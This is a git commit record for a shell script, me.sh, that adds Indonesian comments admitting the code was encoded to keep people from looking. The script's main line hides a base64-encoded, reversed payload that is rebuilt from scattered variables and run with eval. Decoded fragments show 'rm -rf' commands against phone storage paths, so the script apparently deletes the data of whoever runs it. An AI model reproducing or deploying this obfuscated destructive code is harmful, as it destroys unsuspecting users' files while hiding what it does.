a1cf5c24b5fd6926ca804ab3a51b19144c5a84bf
K0NT0L <46758245+K0NT0L@users.noreply.github.com>
2019-02-11 21:26:09 +0700

    Update me.sh

--- me.sh
+++ me.sh
@@ -1,3 +1,8 @@
+# hae bujang'-'
+# coded by star'-'
+# sory w enc biar kgaa pada kepo:*
+# dan colly w ubah dikit ea biar GG :*
+
 gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" 'iICIvh2YlpgchVGbjpwLulmYvgVSGVkUQRCImJXLg0mcKQWZt9CcwF2c0FGaX9CMvQWZ0FGb11WZvU2ZhJ3b0N3LgYmctASbypwc05WZtV3YvR0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnCrl2c112Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnCNl0QE9CMvQWZ0FGb11WZvU2ZhJ3b0N3LgYmctASbypAZh9Gbud3bE9CMvQWZ0FGb11WZvU2ZhJ3b0N3LgYmctASbypgchVGbjpQYpRWZt9CcwF2c0FGaX9CZyF2YkN3LgYmctASbypgchVGbjpQYpRWZt9CcwF2c0FGaX9CMvQWZ0FGb11WZvU2ZhJ3b0N3LgYmctASbypgchVGbjpAZp9mck5WYvEDZyF2YkN3LgYmctASbypgchVGbjpwLkJXYjR2cvAiZy1CItJnCyFWZsNmCiJ2bvQWavJHZuF2Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnChRXYk9CZp9mck5WYvAzLkVGdhxWdtV2LldWYy9Gdz9CImJXLg0mcKIXYlx2YK8CMvQWZ0FGb11WZvU2ZhJ3b0N3LgYmctASbypgCyACclVGbzpgIg4iLu4WYnByZulGdpF2ViAyboNWZKIDIwVWZsNnCKACdhNGbvxGI8ByZul2arNWdG5icNBCZyFGZuFGdzBiZtACdlxWavRnCyFWZsNmC0F2Ys9GbgwGbhR3culGItV2ZgYiJgQXZsdWamBCdlxWavRHIsxWY0NnbpByZrBnCKIXYlx2YKU2ZhJ3b0NXLwVHdlNXL4VXbyVGdKowc19Wb552buFEI5JGIkVGZvN2IKoAazFmYv4Waih3LtVGdzl3cvEyI
 ' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
 x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
